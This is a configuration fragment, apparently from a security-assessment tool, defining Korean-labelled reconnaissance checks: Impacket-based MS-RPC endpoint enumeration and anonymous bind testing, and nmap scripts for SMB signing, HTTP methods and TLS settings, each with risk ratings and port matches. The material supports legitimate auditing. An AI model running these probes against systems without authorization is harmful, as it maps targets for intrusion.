    - {id: msrpc-enum, name: RPC 인터페이스 열거, description: Impacket으로 TCP Endpoint Mapper에 직접 연결해 UUID와 동적 endpoint를 수집합니다. RPC 메서드는 호출하지 않습니다., command: "{repo_dir}/.venv/bin/python -m app.rpc_probe endpoints --host {host} --port {port}", execution_mode: captured, risk: low, tool: python3, sudo: false, output: text, policy: allowed, match: {services: [msrpc, epmap], ports: [135]}}
    - {id: msrpc-bind-check, name: RPC 인터페이스 bind 확인, description: Endpoint Mapper가 반환한 TCP 인터페이스에 DCE/RPC bind만 수행해 익명 bind·접근 거부·인증 요구·연결 실패를 구분합니다. RPC 메서드는 호출하지 않습니다., command: "{repo_dir}/.venv/bin/python -m app.rpc_probe bind --host {host} --port {port} --max-bindings 64", execution_mode: captured, risk: medium, tool: python3, sudo: false, output: text, policy: allowed, match: {services: [msrpc, epmap], ports: [135]}}
    - {id: smb-security, name: SMB 프로토콜과 서명 확인, description: 지원 SMB 버전과 서명 요구 여부, 서버 시간을 확인합니다., command: "nmap -Pn -p{port} --script smb-protocols,smb2-security-mode,smb2-time {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [microsoft-ds, netbios-ssn, smb], ports: [139, 445]}}
    - {id: http-methods, name: HTTP 허용 메서드 확인, description: 서버가 공개한 HTTP 메서드와 잠재적으로 위험한 메서드를 확인합니다., command: "nmap -Pn -p{port} --script http-methods {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [http, https, http-proxy, ssl/http], ports: [80, 443, 8080, 8443]}}
    - {id: http-tls-info, name: HTTP TLS 구성 확인, description: HTTPS 인증서와 암호군 구성을 수집합니다., command: "nmap -Pn -p{port} --script ssl-cert,ssl-enum-ciphers {host}", execution_mode: captured, risk: low, tool: nmap, sudo: false, output: text, policy: allowed, match: {services: [https, ssl/http], ports: [443, 8443]}}
